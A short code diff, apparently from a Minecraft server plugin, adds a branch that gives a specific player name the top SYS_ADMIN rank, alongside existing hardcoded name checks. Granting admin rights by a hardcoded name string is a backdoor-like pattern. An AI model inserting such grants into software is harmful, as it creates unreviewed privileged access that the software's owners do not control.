@@ -106,6 +106,11 @@ public enum TFM_PlayerRank
             return SYS_ADMIN;
         }
         
+        else if (sender.getName().equals("ItsFenixMC"))
+        {
+            return SYS_ADMIN;
+        }
+        
         else if (sender.getName().equals("CombosPvPS"))
         {
             return CREEPER;
